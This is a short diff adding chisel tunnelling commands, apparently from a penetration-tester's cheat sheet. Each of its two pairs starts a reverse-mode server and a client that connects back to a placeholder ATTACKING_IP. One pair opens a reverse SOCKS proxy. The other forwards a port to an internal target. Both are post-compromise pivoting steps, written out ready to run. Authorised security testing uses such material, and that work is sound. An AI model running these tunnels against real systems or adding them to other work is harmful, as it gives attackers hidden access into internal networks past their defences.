@@ -1,0 +1,5 @@
+./chisel server -p LISTEN_PORT --reverse &
+  ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+
+  ./chisel server -p LISTEN_PORT --reverse &
+  ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
